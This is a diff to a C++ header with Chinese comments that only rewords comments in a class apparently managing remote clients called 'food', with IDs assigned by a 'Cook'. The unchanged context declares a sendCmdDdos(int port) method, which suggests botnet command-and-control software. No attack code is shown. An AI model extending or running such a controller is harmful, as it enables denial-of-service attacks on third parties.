@@ -1,4 +1,5 @@
 // 封装了食物这个对象以及与食物的互动
+// 包括对于命令的解析和定义
 
 #ifndef FOOD_H
 #define FOOD_H
@@ -56,11 +57,11 @@ public:
     void sendCmdDdos(int port);
 
 private:
-    TcpSocket *mSock;       // 与客户通讯的socket
+    TcpSocket *mSock;       // 与食物通讯的socket 注意 这里用的是我们设计的TcpSocket类
     QTimer *mLoginTimeout;  // 用来判断客户是否超时登入
     int mId;                // 初始值是-1, 登入后会由Cook分配大于或等于0的ID号码
 
-    // 处理指令
+    // 处理食物发送过来的指令
     // @cmd: 指令
     // @args: 参数
     void processCommand(QByteArray &cmd, QByteArray &args);
